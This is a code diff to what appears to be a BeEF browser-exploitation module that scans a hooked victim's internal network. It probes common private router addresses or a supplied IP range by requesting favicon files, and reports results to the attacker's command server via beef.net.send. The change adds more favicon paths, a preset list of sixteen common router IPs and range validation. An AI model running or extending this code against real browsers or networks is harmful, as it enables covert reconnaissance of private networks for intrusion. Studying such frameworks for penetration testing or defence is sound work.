@@ -13,10 +13,36 @@ beef.execute(function() {
   var timeout = "<%= @timeout %>";
   var wait = "<%= @wait %>";
   var threads = "<%= @threads %>";
-  var urls = new Array('/favicon.ico', '/favicon.png');
+  var urls = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png');
 
   // set target IP addresses
-  if (ipRange != null){
+  if (ipRange == 'common') {
+    // use default IPs
+    ips = [
+      '192.168.0.1',
+      '192.168.0.100',
+      '192.168.0.254',
+      '192.168.1.1',
+      '192.168.1.100',
+      '192.168.1.254',
+      '10.0.0.1',
+      '10.1.1.1',
+      '192.168.2.1',
+      '192.168.2.254',
+      '192.168.100.1',
+      '192.168.100.254',
+      '192.168.123.1',
+      '192.168.123.254',
+      '192.168.10.1',
+      '192.168.10.254'
+    ];
+  } else {
+    // set target IP range
+    var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
+    if (range == null || range[1] == null) {
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied");
+      return;
+    }
     // ipRange will be in the form of 192.168.0.1-192.168.0.254
     // the fourth octet will be iterated.
     // (only C class IP ranges are supported atm)
